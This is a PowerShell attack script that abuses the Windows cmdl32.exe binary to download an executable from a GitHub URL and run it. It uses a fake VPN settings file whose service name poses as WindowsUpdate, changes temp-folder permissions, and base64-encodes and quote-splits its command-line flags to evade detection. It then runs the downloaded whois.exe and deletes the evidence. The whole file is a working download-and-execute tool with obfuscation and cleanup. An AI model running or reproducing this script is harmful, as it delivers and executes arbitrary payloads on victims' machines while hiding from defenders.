Write-Host "[-] cmdl32 Downloader - liquidsky ^_~"
# Create a temp directory to work in
$tempDir = Join-Path -Path $env:TEMP -ChildPath "cmdl32_temp"
New-Item -Path $tempDir -ItemType Directory -Force

# Change to the temp directory
Set-Location -Path $tempDir
Write-Host "[*] Working directory changed to $tempDir"

Write-Host "[*] Denying delete permissions for current user"
# Deny delete permissions in the temp directory for the current user
icacls $tempDir /deny "$($env:USERNAME):(OI)(CI)(DE,DC)"

Write-Host "[*] Setting temp environment variable"
# Set the TMP environment variable to the temp directory
$env:TMP = $tempDir

Write-Host "[*] Creating VPN settings file"
# Define settings file content
$settingsContent = @"
[Connection Manager]
CMSFile=settings.txt
ServiceName=WindowsUpdate
TunnelFile=settings.txt
[Settings]
UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
"@
Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent

Write-Host "[*] Performing download with cmdl32 via cmd.exe"

# Assuming cmdl32 is in system32 or accessible, let's copy it to temp directory
$cmdl32Path = "cmdl32"
$cmdl32TempPath = Join-Path -Path $tempDir -ChildPath "cmdl32.exe"

# Check if cmdl32 exists and copy to temp if needed
if (!(Test-Path -Path $cmdl32TempPath)) {
    Write-Host "[*] cmdl32.exe not found in temp directory. Copying from system32."
    Copy-Item -Path "C:\Windows\System32\cmdl32.exe" -Destination $cmdl32TempPath
}

# Double check if cmdl32 was copied successfully
if (!(Test-Path -Path $cmdl32TempPath)) {
    Write-Host "[!] cmdl32.exe not found, cannot proceed with download."
    Exit
}

Write-Host "[*] Using cmdl32.exe at: $cmdl32TempPath"

# Obfuscate the flags for cmdl32 and use string encoding to hide command structure
$commandToRun = "/vpn /lan `"$tempDir\settings.txt`""
Write-Host "[*] Base64 encoding command: $commandToRun"
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($commandToRun))

Write-Host "[*] Encoded Command: $encodedCommand"

# Construct cmd.exe argument to decode and execute the base64 command
$arguments = "/c $cmdl32TempPath /v`"p`"n /l`"a`"n `"$encodedCommand`""
Write-Host "[*] Starting cmd.exe with obfuscated arguments: $arguments"

# Start cmd.exe with the obfuscated cmdl32 arguments
try {
    Start-Process -FilePath "cmd.exe" -ArgumentList $arguments -NoNewWindow -Wait
    Write-Host "[*] Download complete with cmdl32."
} catch {
    Write-Host "[!] cmdl32 failed: $($_.Exception.Message)"
    # Revert permissions before exiting
    icacls $tempDir /remove:d "$env:USERNAME"
    Exit
}

Write-Host "[*] Reverting permissions"
icacls $tempDir /remove:d "$env:USERNAME"

Write-Host "[*] Renaming downloaded file for execution"
# Find the downloaded file (VPN*.tmp)
$downloadedFile = Get-ChildItem -Path $tempDir -Filter "VPN*.tmp" | Select-Object -First 1
if ($downloadedFile) {
    Write-Host "[*] Downloaded file found: $($downloadedFile.FullName)"
    
    # Construct the target path for renaming the file
    $targetPath = Join-Path -Path $tempDir -ChildPath "whois.exe"
    
    # Rename (or move) the downloaded file
    try {
        Move-Item -Path $downloadedFile.FullName -Destination $targetPath -Force
        Write-Host "[*] Renamed (moved) VPN*.tmp to whois.exe."
    } catch {
        Write-Host "[!] Failed to rename file: $($_.Exception.Message)"
        Exit
    }
} else {
    Write-Host "[!] No downloaded file found matching 'VPN*.tmp'. Exiting script."
    Exit
}

Write-Host "[*] Executing the downloaded file"
# Execute the renamed file
if (Test-Path "$tempDir\whois.exe") {
    Start-Process -FilePath "$tempDir\whois.exe" -NoNewWindow -Wait
    Write-Host "[*] Execution complete."
} else {
    Write-Host "[!] whois.exe not found after renaming. Exiting script."
    Exit
}

Write-Host "[*] Cleaning up downloaded file"
# Clean up downloaded files
Remove-Item -Path "$tempDir\whois.exe" -Force
Remove-Item -Path "$tempDir\settings.txt" -Force
Write-Host "[*] Script complete."
